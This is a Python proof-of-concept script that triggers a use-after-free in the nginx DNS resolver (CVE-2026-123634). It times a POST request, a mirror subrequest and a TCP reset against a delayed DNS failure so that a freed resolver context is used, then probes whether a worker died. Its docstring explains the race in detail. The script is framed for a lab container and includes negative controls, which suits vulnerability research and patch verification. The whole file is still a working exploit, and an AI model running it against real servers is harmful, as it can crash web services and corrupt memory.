#!/usr/bin/env python3
"""CVE-2026-123634 trigger client (NGINX2Root sibling: DNS resolver
use-after-free, nginx 1.31.8; fixed in 1.31.9).

Stdlib-only. Drives the request whose resolution lands BOTH the main
request and its mirror subrequest on the same resolver node, then kills
the client connection so the failure walk's first handler terminates the
request tree and frees the sibling's resolver ctx while the walk still
holds it.

BLOCKING DISCIPLINE (the reason this file was rewritten): no socket
operation may outlive its timeout and no attempt may outlive the
watchdog. Every socket gets settimeout(), the whole attempt runs under a
SIGALRM watchdog (--watchdog, default 20 s), and --repeat is capped.
Nothing here can ever hang the shell that launched it.

Interleaving (timings from this client; the DNS answer delay is encoded
in the query name — see lab/123634/dns/dnsd.py):

  t0       send request HEADERS (POST, Content-Length: 8) for a fresh name
           -> nginx: mirror subrequest posted; main blocks reading the body
  t0+d1    send the BODY
           -> mirror subrequest already resolved (ctx registered at the
              waiting-list TAIL); main's proxy_pass now starts, its ctx
              attaches at the HEAD of the same resolver node
  t0+d1+d2 RST the connection (SO_LINGER 0)
           -> the read event is deleted (body done -> block_reading), so
           nginx does NOT notice yet; the dead socket surfaces only
              inside the resolver walk, at the 502 send
  query+D  the lab DNS server answers SERVFAIL/REFUSED/NXDOMAIN
           -> ngx_resolver_process_a failure walk:
              iteration 1 = MAIN ctx (head): handler finalizes upstream
              502; the send fails on the RST'd socket ->
              ngx_http_terminate_request -> main cleanup list includes
              the MIRROR's upstream cleanup -> ngx_resolve_name_done
              on the mirror ctx: rn->waiting is already NULL ->
              ALERT "could not cancel ... resolving" -> ctx FREED
              iteration 2 = MIRROR ctx: write ctx->state/valid, read
              ctx->next (offset 0 == glibc tcache safe-link, non-zero
              on glibc >= 2.32), call ctx->handler — USE AFTER FREE.

Variants (--variant):
  primary         the sequence above (RST before the DNS answer)
  tight           same with short margins (10 ms)
  answer_then_rst RST long after the DNS answer (walk ran on a live
                  socket -> no terminate inside the walk -> no bug;
                  negative race control)
  rst_before_body RST while the body is still pending (terminate runs
                  OUTSIDE the walk, unlinks the mirror ctx cleanly ->
                  no bug; negative race control)
  half_close      FIN instead of RST (no EPIPE on the 502 send -> no
                  terminate inside the walk -> no bug; negative control)
  norst           keep the socket open and read the 502s (clean-path
                  control: both handlers run, ctx freed orderly, no
                  ALERT on either build)
  dead_ip         DNS success to an unroutable A record (connect-fail
                  variant of Xint's writeup; upstream connect is async,
                  so nothing frees a pending sibling at walk time)

Evidence per attempt is printed as [name] lines, including a post-
attempt health probe (the client-observable worker-liveness signal: a
dead worker means the master still accepts but nothing ever answers,
so /health times out). The authoritative evidence lives in the nginx
error logs (docker compose logs) — the 1.31.8 ALERT "could not cancel
<name> resolving" marks the freed-ctx path, and ASAN builds print the
heap-use-after-free report there.

Run inside the lab's probe container (always under an outer timeout):

    docker compose exec -T probe python /poc/123634/trigger.py \
        --target vuln:8080 --repeat 10
"""

from __future__ import annotations

import argparse
import signal
import socket
import struct
import sys
import time

VARIANTS = (
    "primary",
    "tight",
    "answer_then_rst",
    "rst_before_body",
    "half_close",
    "norst",
    "dead_ip",
)

BODY = b"12345678"
MAX_REPEAT = 500


class Watchdog(Exception):
    """Raised (via SIGALRM) when one attempt exceeds the time budget."""


def fresh_name(seq: int, mode: str, answer_ms: int) -> str:
    return f"{mode}-{answer_ms}-{seq}.u123634.test"


def send_headers(host: str, port: int, name: str, timeout: float) -> socket.socket:
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)  # explicit: every later op on s is bounded
    s.sendall(
        f"POST /h HTTP/1.1\r\n"
        f"Host: {name}\r\n"
        f"Content-Length: {len(BODY)}\r\n"
        f"Connection: close\r\n"
        f"\r\n".encode()
    )
    return s


def hard_rst(s: socket.socket) -> None:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
    s.close()


def probe_health(host: str, port: int, timeout: float) -> str:
    """Client-side worker-liveness check: GET /health, bounded."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(b"GET /health HTTP/1.1\r\nHost: localhost\r\n"
                  b"Connection: close\r\n\r\n")
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(512)
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return "<EOF: accepted but no worker answer (worker dead?)>"
        first = data.split(b"\r\n", 1)[0].decode("latin1", "replace")
        return first
    except socket.timeout:
        return "<timeout: accepted but no worker answer (worker dead?)>"
    except OSError as e:
        return f"<oserror: {e}>"


def attempt(host: str, port: int, seq: int, variant: str,
            t_body: float, t_rst: float, answer_ms: int, read_wait: float,
            conn_timeout: float, verbose: bool = False) -> None:
    mode = {"dead_ip": "ok"}.get(variant, "sf")
    name = fresh_name(seq, mode, answer_ms)
    t0 = time.monotonic()

    if variant == "rst_before_body":
        s = send_headers(host, port, name, conn_timeout)
        hard_rst(s)
        print(f"[{name}] rst_before_body: RST immediately after headers")
        return

    s = send_headers(host, port, name, conn_timeout)
    time.sleep(t_body)
    s.sendall(BODY)

    if variant == "norst":
        s.settimeout(read_wait)
        try:
            data = s.recv(4096)
            status = data.split(b"\r\n", 1)[0].decode("latin1", "replace") \
                if data else "<EOF>"
        except socket.timeout:
            status = "<timeout>"
        s.close()
        print(f"[{name}] norst: client read: {status}")
        return

    if variant == "half_close":
        s.shutdown(socket.SHUT_WR)
        s.settimeout(read_wait)
        try:
            s.recv(4096)
        except (socket.timeout, OSError):
            pass
        s.close()
        print(f"[{name}] half_close: FIN'd after body, closed")
        return

    if variant == "answer_then_rst":
        # the DNS query leaves at ~t0; hold answer_ms, add margin, then RST:
        # the walk ran long before, on a live socket (negative control)
        wait = answer_ms / 1000.0 + 0.6
        time.sleep(wait)
        hard_rst(s)
        print(f"[{name}] answer_then_rst: RST {wait * 1000:.0f} ms after "
              f"headers (answer held {answer_ms} ms)")
        return

    # primary / tight / dead_ip: RST after the body, before the held answer
    time.sleep(t_rst)
    hard_rst(s)
    # wait out the held answer (query left at ~t0), then report liveness
    elapsed = time.monotonic() - t0
    remain = max(0.0, answer_ms / 1000.0 - elapsed) + 0.8
    time.sleep(remain)
    health = probe_health(host, port, 2.0)
    print(f"[{name}] {variant}: body at {t_body * 1000:.0f} ms, RST at "
          f"{(t_body + t_rst) * 1000:.0f} ms, answer held {answer_ms} ms, "
          f"health: {health}")


def _alarm(signum, frame):
    raise Watchdog("attempt exceeded watchdog budget")


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", default="vuln:8080",
                    help="host:port of an nginx service (default vuln:8080)")
    ap.add_argument("--variant", default="primary", choices=VARIANTS)
    ap.add_argument("--repeat", type=int, default=1,
                    help=f"attempts, each with a fresh name (capped at {MAX_REPEAT})")
    ap.add_argument("--t-body", type=float, default=0.15,
                    help="headers -> body delay, seconds (default 0.15)")
    ap.add_argument("--t-rst", type=float, default=0.15,
                    help="body -> RST delay, seconds (default 0.15)")
    ap.add_argument("--answer-ms", type=int, default=500,
                    help="DNS answer hold, ms, encoded in the query name "
                         "(default 500; must exceed the body+RST interleaving)")
    ap.add_argument("--read-wait", type=float, default=3.0,
                    help="how long norst/half_close variants read, seconds")
    ap.add_argument("--conn-timeout", type=float, default=2.0,
                    help="per-socket-op timeout, seconds (default 2.0)")
    ap.add_argument("--watchdog", type=float, default=20.0,
                    help="SIGALRM budget per attempt, seconds (default 20)")
    args = ap.parse_args()

    host, _, port = args.target.partition(":")
    if not port.isdigit():
        print(f"bad target {args.target!r} (want host:port)", file=sys.stderr)
        return 2
    if not 1 <= args.repeat <= MAX_REPEAT:
        print(f"--repeat must be 1..{MAX_REPEAT}", file=sys.stderr)
        return 2

    signal.signal(signal.SIGALRM, _alarm)
    for i in range(args.repeat):
        signal.setitimer(signal.ITIMER_REAL, args.watchdog)
        try:
            attempt(host, int(port), i, args.variant, args.t_body, args.t_rst,
                    args.answer_ms, args.read_wait, args.conn_timeout)
        except Watchdog as e:
            print(f"[attempt {i}] WATCHDOG TRIPPED after {args.watchdog}s: {e}")
        except OSError as e:
            print(f"[attempt {i}] client error: {e}")
        finally:
            signal.setitimer(signal.ITIMER_REAL, 0)
        time.sleep(0.3)  # let logs settle before the next attempt

    print("done — check the target's error log for the ALERT "
          "'could not cancel ... resolving' marker / worker exits")
    return 0


if __name__ == "__main__":
    sys.exit(main())
